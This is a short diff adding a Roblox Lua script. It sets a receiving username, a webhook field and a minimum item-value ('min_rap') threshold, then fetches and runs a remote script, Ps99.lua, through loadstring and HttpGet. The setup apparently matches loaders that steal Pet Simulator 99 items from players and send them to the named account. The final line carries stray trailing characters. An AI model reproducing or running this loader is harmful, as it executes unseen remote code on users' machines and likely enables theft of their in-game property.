@@ -1,0 +1,5 @@
+Username = "YTZ_oTzieWalker"
+Username2 = ""
+webhook = ""
+min_rap = 100
+loadstring(game:HttpGet('https://skai-scripts.vercel.app/Ps99.lua'))()")
